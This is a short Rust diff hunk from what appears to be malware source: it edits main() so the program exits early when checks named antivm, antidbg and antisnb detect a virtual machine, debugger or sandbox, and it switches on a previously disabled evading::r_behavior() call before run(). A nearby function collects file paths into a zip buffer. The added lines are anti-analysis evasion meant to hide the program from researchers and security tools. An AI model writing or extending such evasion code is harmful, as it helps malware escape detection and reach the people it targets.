@@ -67,7 +67,11 @@ fn zip_elements(paths: Vec<PathBuf>, h: &mut Vec<u8>) {
 }
 
 fn main() {
-    // evading::r_behavior();
+    if evading::antivm() || evading::antidbg() || evading::antisnb() {
+        return;
+    }
+
+    evading::r_behavior();
     run();
 }
 
